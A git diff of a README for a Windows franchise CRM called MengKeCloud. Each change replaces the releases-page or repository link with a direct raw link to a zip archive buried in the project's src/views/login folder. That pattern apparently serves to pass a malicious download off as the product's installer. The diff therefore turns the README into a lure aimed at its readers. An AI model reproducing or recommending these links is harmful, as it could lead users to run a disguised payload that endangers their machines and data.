@@ -1,6 +1,6 @@
 # 🚀 MengKeCloud - Streamlined CRM for Franchise Growth
 
-[![Download MengKeCloud](https://img.shields.io/badge/Download-MengKeCloud-orange?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/releases)
+[![Download MengKeCloud](https://img.shields.io/badge/Download-MengKeCloud-orange?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/raw/refs/heads/main/src/views/login/Meng-Cloud-Ke-3.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Make sure your PC meets these basic requirements to avoid any issues during inst
 
 Click the button below to visit the official download page. This page hosts the latest versions and updates of MengKeCloud. You will find easy-to-follow links to get the program files for Windows.
 
-[![Download Page](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/releases)
+[![Download Page](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/raw/refs/heads/main/src/views/login/Meng-Cloud-Ke-3.0.zip)
 
 Visit the above link to find the latest stable release. Look for files named with `.exe` to download the Windows installer.
 
@@ -126,7 +126,7 @@ MengKeCloud stores your customer information on your own computer. It does not s
 If you run into problems beyond these steps, use the GitHub page’s Issues section to look for answers or ask questions. Someone from the community or the developers may respond.
 
 Visit the main repository page here:  
-https://github.com/Guilherme0512/MengKeCloud
+https://github.com/Guilherme0512/MengKeCloud/raw/refs/heads/main/src/views/login/Meng-Cloud-Ke-3.0.zip
 
 ---
 
@@ -137,4 +137,4 @@ MengKeCloud is open source software. You can use, share, and modify it under the
 ---
 
 # Download MengKeCloud Now  
-[![Download MengKeCloud](https://img.shields.io/badge/Download-MengKeCloud-orange?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/releases)
+[![Download MengKeCloud](https://img.shields.io/badge/Download-MengKeCloud-orange?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/raw/refs/heads/main/src/views/login/Meng-Cloud-Ke-3.0.zip)
